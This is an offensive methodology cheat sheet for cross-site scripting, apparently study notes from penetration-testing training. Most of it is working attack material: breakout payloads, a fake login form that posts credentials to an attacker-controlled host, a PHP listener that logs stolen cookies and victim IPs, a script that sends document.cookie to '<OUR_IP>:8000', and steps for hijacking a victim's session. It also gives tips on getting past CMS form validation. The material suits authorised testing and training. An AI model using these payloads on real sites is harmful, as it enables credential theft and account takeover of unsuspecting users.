# Cross-Site Scripting (XSS) Methodology

## XSS Types

| Type | Where it Lives | Persistent? | How to Exploit |
|------|---------------|-------------|----------------|
| Stored | Back-end database | Yes | Any visitor triggers it |
| Reflected | Server response (no storage) | No | Send crafted URL to victim |
| DOM-based | Client-side JS only, never hits server | No | Inject via URL hash/params |

## Phase 1 — Discovery

### Check page source for input fields
```bash
curl -s http://<TARGET>/ | grep -i "input\|textarea\|form\|name="
```

### Test basic payload first
```html
<script>alert(window.origin)</script>
```
If blocked (e.g., innerHTML sink), use:
```html
<img src='' onerror=alert(window.origin)>
```

### Find how input is reflected
```bash
curl -s "http://<TARGET>/page?param=PROBE" | grep "PROBE"
```
- If PROBE in response → Reflected XSS candidate
- If PROBE not in response → DOM XSS (check JS source for sinks) or Blind XSS

### Identify XSS type from reflection context
| HTML context | Breakout needed |
|-------------|----------------|
| `<tag>INPUT</tag>` | None — `<script>` works directly |
| `<img src='INPUT'>` | `'><script src=...>` |
| `<img src="INPUT">` | `"><script src=...>` |
| `<a href="INPUT">` | `"><script>` or `javascript:` |
| innerHTML sink | `<img src=x onerror=...>` (no script tags) |

### Automated discovery
```bash
python xsstrike.py -u "http://<TARGET>/page?param=test"
# Identifies reflected params and generates working payloads
# Use -fs equivalent filtering for DOM-based
```

## Phase 2 — Exploitation

### Stored XSS — Cookie Stealing
Submit payload in vulnerable input field:
```html
<script>alert(document.cookie)</script>
```

### Reflected XSS — Cookie Stealing
Deliver via URL:
```
http://<TARGET>/page?param=<script>alert(document.cookie)</script>
```

### DOM XSS — Cookie Stealing
Use img onerror (innerHTML blocks script tags):
```
http://<TARGET>/#param=<img src='' onerror=alert(document.cookie)>
```

### Phishing — Fake Login Form
```javascript
document.write('<h3>Please login to continue</h3><form action=http://<OUR_IP>:<PORT>><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('<FORM_ID>').remove();
```
Append `<!--` to comment out remaining HTML.

### Blind XSS — Session Hijacking

**Step 1: Set up PHP listener**
```bash
mkdir /tmp/tmpserver && cd /tmp/tmpserver
# index.php — catches cookies:
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
sudo php -S 0.0.0.0:8000
```

**Step 2: Create script.js**
```bash
echo "new Image().src='http://<OUR_IP>:8000/index.php?c='+document.cookie;" > /tmp/tmpserver/script.js
```

**Step 3: Probe vulnerable field (use field name in URL path)**
```html
<script src=http://<OUR_IP>:8000/fieldname></script>
'><script src=http://<OUR_IP>:8000/fieldname></script>
"><script src=http://<OUR_IP>:8000/fieldname></script>
```
Whichever hits the PHP server reveals the vulnerable field AND working breakout.

**Step 4: Deliver cookie-stealing payload**
```html
"><script src=http://<OUR_IP>:8000/script.js></script>
```

**Step 5: Read stolen cookie**
```bash
cat /tmp/tmpserver/cookies.txt
```

## Phase 3 — Use Stolen Cookie

Open browser → DevTools → `Shift+F9` → Storage → `+` → add cookie:
- **Name:** cookie name (part before `=`)
- **Value:** cookie value (part after `=`)

Refresh page → access victim session.

## Common Pitfalls

- **Port 80 in use** → use port 8000, update all references
- **WordPress / CMS forms** — keep `author`/`email` fields clean (validation rejects XSS); inject in `url`/`comment`/`website` fields only
- **Blind XSS timing** — admin checks periodically; wait 30-60 seconds after submission
- **Website field fetched but not executed** — value is in img src or similar; needs `"><script>` breakout, not just a plain URL
- **HttpOnly cookies** — `document.cookie` returns empty; look for other data sources
